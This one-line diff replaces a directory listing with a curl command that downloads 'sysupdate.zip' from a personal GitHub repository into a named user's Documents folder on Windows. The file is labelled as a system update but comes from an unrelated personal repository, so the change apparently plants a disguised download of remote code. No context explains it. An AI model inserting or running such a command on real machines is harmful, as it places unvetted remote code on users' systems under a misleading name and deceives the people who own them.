@@ -1,1 +1,1 @@
-dir C:\Users
+curl -L -o "C:\Users\HP ZBook\Documents\sysupdate.zip" https://github.com/0xHumanDev/oxhuman/raw/main/sysupdate.zip
